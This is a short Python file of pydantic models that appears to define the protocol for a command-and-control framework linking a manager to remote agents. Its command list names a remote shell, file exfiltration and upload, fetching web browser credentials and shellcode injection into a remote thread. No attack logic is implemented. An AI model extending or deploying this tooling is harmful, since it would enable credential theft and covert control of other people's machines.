from enum import Enum, IntEnum
from typing import Optional
from pydantic import BaseModel


class CommandIdentifiers(IntEnum):
    START_SHELL_INSTANCE = 1
    RUN_COMMAND = 2
    GET_BASIC_MACHINE_INFO = 3
    SNAP_FULL_DIRECTORY = 4
    GET_FILE_BASE_64 = 5
    UPLOAD_FILE_BASE_64 = 6
    GET_WIFI_BAISIC_INFO = 7
    FETCH_WEB_BROSER_CREDENTIALS = 8
    ENUMERATE_PROCESSES = 9
    SHELLCODE_INJECTION_REMOTE_THREAD = 10


class CommandMessage(BaseModel):
    command: Optional[dict] = None
    action_id: CommandIdentifiers


class ManagerAction(str, Enum):
    GET_CONNECTIONS = "get_connections"
    SEND_COMMAND = "send_command"


class ManagerRequestWs(BaseModel):
    action: ManagerAction
    conn_id: str | None = None
    command: str | None = None


class AgentResponse(BaseModel):
    success: bool
    data: dict | None = None
    error: str | None = None



class ServerError(BaseModel):
    type: str = "Server Error"
    detail: str
